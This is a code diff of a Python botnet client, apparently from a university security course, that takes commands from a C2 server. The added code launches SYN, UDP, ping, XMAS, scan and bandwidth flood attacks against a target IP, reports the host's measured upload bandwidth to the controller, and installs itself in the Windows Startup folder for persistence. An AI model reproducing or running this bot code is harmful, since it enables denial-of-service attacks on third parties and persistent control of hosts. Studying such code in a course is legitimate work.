@@ -1,20 +1,43 @@
 # Keen to start
+import bandwidth_ddos
+import getpass
+import json
+import math
+import os
+import ping_flood
+import requests
+import scan_flood
+import shutil
 import signal
 import socket
-import json
+import speedtest
+import syn_flood
+import sys
 import threading
+import multiprocessing as mp
 import time
+import udp_flood
+import xmas_attack
+from config import API_URL
 from enum import Enum
 from socket import timeout
-import syn_flood
-
-import requests
 from win10toast import ToastNotifier
 
-from config import API_URL
-
 BOT_ID_NAME = ''  # Replace this for each new bot handed out.
+NUM_PACKETS_TO_SEND = 1000000000
 
+attackTypes = [
+    "SYN_FLOOD",
+    "UDP_FLOOD",
+    "PING_FLOOD",
+    "SCAN_FLOOD",
+    "XMAS_FLOOD",
+    "BANDWIDTH_DDOS"
+]
+
+def truncate(n, decimals=0):
+    multiplier = 10 ** decimals
+    return int(n * multiplier) / multiplier
 
 class IcarusBot:
     """
@@ -33,18 +56,31 @@ class IcarusBot:
         """
         file = open("bot_name.txt", "r")
         global BOT_ID_NAME
+        global NUM_PACKETS_TO_SEND
         BOT_ID_NAME = file.read()
         print(BOT_ID_NAME, "IS RUNNING")
 
+        print("GAUGING SPEED")
+        st = speedtest.Speedtest()
+        st.get_servers()
+        st.get_best_server()
+        st.upload()
+        self.uploadBandwidth = truncate(st.results.dict()["upload"] / 1024 / 1024, 2)
+        print("SPEED GAUGED:", self.uploadBandwidth)
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
         self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
         self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
         self.c2_server_details = ()
 
         self.status = 'STARTED'
+        self.attack_type = 'NONE'
         self.attack_runtime = 0  # Used for tracking duration of attack.
         self.target_ip = ''
 
+        self.exceptionsThrown = 0  # Tracks errors thrown during operation.
+
+        # This is to deal with the active subprocess
+        self.mp = []
 
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
@@ -61,9 +97,10 @@ class IcarusBot:
                 if self.c2_server_details[0] != 'not_active' and self.c2_server_details[1] != 'not_active':
                     # there is a server available, let's go ahead and connect, ignoring the nameserver again until they disconnect.
                     nameserver_available = True
-                time.sleep(5)
+                    time.sleep(5)
             # Now that we've got the C2 server IP, let's go ahead and setup the socket for connecting.
             print("nameserver found")
+            notification("CONNECTED")
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
             self.sock.connect((self.c2_server_details[0], int(self.c2_server_details[1])))
             self.main_loop()
@@ -105,6 +142,7 @@ class IcarusBot:
             'ip': self.ip,
             'status': self.status,
             'id': self.bot_id,
+            'bandwidth': self.uploadBandwidth,
             'runtime': self.attack_runtime,
             'target': self.target_ip
         }
@@ -121,6 +159,9 @@ class IcarusBot:
                 request_type = jsonMsg['request']
                 attack_type = jsonMsg['attack']
                 target_ip = jsonMsg['targetIP']
+                # These are contained in all packets, irrespective of status/attack/stop call.
+                ports = jsonMsg['ports']
+                runtime = jsonMsg['runtime']
                 response = ''
                 # Through each if statement, we specify what we're going to do. The logic is contained in each if.
                 if request_type == 'status':
@@ -130,26 +171,126 @@ class IcarusBot:
                         'status': self.status,
                         'id': self.bot_id,
                         'runtime': self.attack_runtime,
-                        'target': self.target_ip
+                        'bandwidth': self.uploadBandwidth,
+                        'target': self.target_ip,
+                        'error': 'none',
+                        'exceptionsThrown': self.exceptionsThrown
                     }
                     response = json.dumps(response)
                 elif request_type == 'attack':
                     # TODO: Implement attacks here
                     # TODO: Number of packets to send?
-                    if attack_type == 'SYN_FLOOD':
-                        #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, 1))
-                        #attack_thread.start()
-                        #attack_thread.join()
-                        syn_flood.SYN_Flood(target_ip, [1])
-                    else:
-                        print("No attack type specified")
+                    # Angus: We just keep running until a stop attack is issued.
+                    # TODO: Specify port(s) to attack
+                    try:
+                        portList = ports[1:len(ports) - 1].split(",")
+                        for n in range(0, len(portList)):
+                            portList[n] = int(portList[n])
+                        print(portList)
+                        if attack_type in attackTypes:
+                            self.attack_type = attack_type
+                            self.status = "ATTACKING"
+                            self.target_ip = target_ip
+
+                        if attack_type == 'SYN_FLOOD':
+                            # attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
+                            # attack_thread.start()
+                            # attack_thread.join() <-- Angus: DO NOT USE THIS. IT WILL BLOCK THE MAIN THREAD UNTIL IT STOPS. WE WANT IT TO RUN ASYNCHRONOUSLY.
+                            #                                   even use multiprocessing like the following code example:
+                            #                                   import multiprocessing
+                            #                                   proc = multiprocessing.Process(target=your_proc_function, args=())
+                            #                                   proc.start()
+                            #                                   # Terminate the process
+                            #                                   proc.terminate()  # sends a SIGTERM
+
+                            # The following code is hilariously long and redundant, but who cares?
+                            for n in range(0, 15):
+                                self.mp = mp.Process(target=syn_flood.SYN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
+                                self.mp.start()
+                        elif attack_type == 'XMAS_FLOOD':
+                            if self.mp is None:
+                                self.mp = mp.Process(target=xmas_attack.XMAS_Attack,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=xmas_attack.XMAS_Attack,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
+                                self.mp.start()
+                        elif attack_type == 'PING_FLOOD':
+                            if self.mp is None:
+                                self.mp = mp.Process(target=ping_flood.PING_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=ping_flood.PING_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
+                        elif attack_type == 'UDP_FLOOD':
+                            if self.mp is None:
+                                self.mp = mp.Process(target=udp_flood.UDP_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=udp_flood.UDP_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
+                        elif attack_type == 'SCAN_FLOOD':
+                            for n in range(0, 15):
+                                self.mp = mp.Process(target=scan_flood.SCAN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
+                        elif attack_type == 'BANDWIDTH_DDOS':
+                            if self.mp is None:
+                                self.mp = mp.Process(target=bandwidth_ddos.BANDWIDTH_ddos,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList, 65495))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=bandwidth_ddos.BANDWIDTH_ddos,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList, 65495))
+                                self.mp.start()
+
+                        print("EXECUTING ATTACK:", attack_type)
+                        response = {
+                            'ip': self.ip,
+                            'status': self.status,
+                            'id': self.bot_id,
+                            'runtime': self.attack_runtime,
+                            'bandwidth': self.uploadBandwidth,
+                            'target': self.target_ip,
+                            'error': 'none',
+                            'exceptionsThrown': self.exceptionsThrown
+                        }
+                        response = json.dumps(response)
+                    except Exception as ex:
+                        self.exceptionsThrown += 1
+                        print("ERROR EXECUTING ATTACK", ex)
+                        response = {
+                            'ip': self.ip,
+                            'status': self.status,
+                            'id': self.bot_id,
+                            'runtime': self.attack_runtime,
+                            'bandwidth': self.uploadBandwidth,
+                            'target': self.target_ip,
+                            'error': 'failed_starting_attack',
+                            'exceptionsThrown': self.exceptionsThrown
+                        }
+                        response = json.dumps(response)
 
                 # This will then send the message back to the server, irrespective of the flag.
                 time.sleep(2)
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
-            except timeout or Exception:
+            except timeout:
                 # the server has lagged out
                 print("timeout")
+                return
+            except Exception as ex:
+                print("EXCEPTION", ex)
+                self.exceptionsThrown += 1
                 return
 
     #
@@ -181,12 +322,18 @@ def notification(action):
     if action == "STARTED":
         title = "ICARUS BOT STARTED"
         body = "I NOW HAVE FULL ACCESS TO YOUR SYSTEMS (COMS4507)"
+    elif action == "CONNECTED":
+        title = "ICARUS CONNECTED TO C2 SERVER"
+        body = "NOTHING TO WORRY ABOUT"
     elif action == "ATTACKING":
         title = "ICARUS BOT ATTACKING"
-        body = "The bot gave in to peer pressure and is attacking something"
+        body = "I AM ATTACKING. PLEASE IGNORE."
+    elif action == "STOPPED":
+        title = "ICARUS IS DONE ATTACKING"
+        body = "I AM DONE ATTACKING. PLEASE IGNORE."
     else:
         title = "ICARUS BOT CALLED OFF"
-        body = "The bot finished it's job"
+        body = "The bot finished its job"
 
     toast.show_toast(
         title,
@@ -197,10 +344,17 @@ def notification(action):
     )
 
 
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.realpath(sys.argv[0])
+    exe_path = f"{os.environ['SYSTEMDRIVE']}\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\coms4507-bot.exe"
+    # only copy across if startup directory exists and file doesn't
+    if os.path.exists(os.path.dirname(exe_path)) and not os.path.exists(exe_path):
+        shutil.copy(file_path, exe_path)
+
+
 def main():
-    bot = IcarusBot()
-    bot.notification(True)
-    bot.start()
+    IcarusBot()
 
 
 if __name__ == "__main__":
